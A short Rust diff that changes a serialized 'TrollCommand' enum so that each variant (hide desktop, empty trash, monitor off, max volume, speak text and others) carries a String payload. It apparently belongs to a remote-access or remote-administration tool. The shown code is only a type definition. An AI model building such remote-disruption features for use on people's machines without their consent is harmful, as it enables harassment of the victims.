@@ -266,23 +266,24 @@ pub struct ScreenshotData {
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+#[serde(tag = "type", content = "payload")]
 pub enum TrollCommand {
-    HideDesktop,
-    ShowDesktop,
-    HideTaskbar,
-    ShowTaskbar,
-    HideNotify,
-    ShowNotify,
-    FocusDesktop,
-    EmptyTrash,
-    RevertMouse,
-    NormalMouse,
-    MonitorOff,
-    MonitorOn,
-    MaxVolume,
-    MinVolume,
-    MuteVolume,
-    UnmuteVolume,
+    HideDesktop(String),
+    ShowDesktop(String),
+    HideTaskbar(String),
+    ShowTaskbar(String),
+    HideNotify(String),
+    ShowNotify(String),
+    FocusDesktop(String),
+    EmptyTrash(String),
+    RevertMouse(String),
+    NormalMouse(String),
+    MonitorOff(String),
+    MonitorOn(String),
+    MaxVolume(String),
+    MinVolume(String),
+    MuteVolume(String),
+    UnmuteVolume(String),
     SpeakText(String),
 }
 
